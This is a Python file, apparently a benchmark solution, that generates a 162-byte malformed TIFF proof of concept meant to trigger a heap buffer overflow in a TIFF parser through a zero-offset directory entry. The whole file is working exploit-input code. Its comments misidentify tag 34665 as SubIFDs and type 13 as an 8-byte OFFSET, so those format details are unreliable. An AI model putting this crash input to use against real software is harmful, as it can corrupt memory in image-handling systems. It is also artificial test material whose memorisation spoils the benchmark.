import os
import struct
import tempfile
import subprocess

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a TIFF file that triggers the heap buffer overflow
        # based on vulnerability description: invalid offline tags with value offset of zero
        
        # Build minimal TIFF structure
        # TIFF header (little-endian)
        tiff_header = struct.pack('<HHL', 0x4949, 42, 8)  # II, 42, offset to first IFD
        
        # IFD entry for an "offline" tag with offset zero
        # Use a tag that would typically be an OFFSET type (type 13)
        ifd_entries = []
        
        # Number of directory entries - we'll use 1 for simplicity
        num_entries = 1
        
        # Create an invalid offline tag entry
        # Tag 34665 is a known "offline" tag in libtiff (TIFFTAG_SUBIFD)
        # Type 13 is OFFSET (8-byte unsigned)
        # Count 1, but offset is zero
        tag = 34665  # SubIFDs tag
        tag_type = 13  # OFFSET type
        count = 1
        value_offset = 0  # Invalid offset of zero
        
        ifd_entry = struct.pack('<HHL', tag, tag_type, count)
        # For OFFSET type, the value should be stored at the offset location
        # but we're setting the offset itself to zero
        ifd_entry += struct.pack('<L', value_offset)
        ifd_entries.append(ifd_entry)
        
        # Next IFD offset (0 = end)
        next_ifd_offset = 0
        
        # Calculate IFD position
        ifd_position = len(tiff_header)
        
        # Build the complete TIFF
        poc = bytearray()
        poc.extend(tiff_header)
        
        # IFD starts here
        poc.extend(struct.pack('<H', num_entries))
        for entry in ifd_entries:
            poc.extend(entry)
        poc.extend(struct.pack('<L', next_ifd_offset))
        
        # Add some extra data to meet ground-truth length
        # The exact content isn't critical as long as we trigger the vulnerability
        remaining = 162 - len(poc)
        if remaining > 0:
            poc.extend(b'A' * remaining)
        
        # Ensure exact length matches ground-truth
        if len(poc) > 162:
            poc = poc[:162]
        
        return bytes(poc)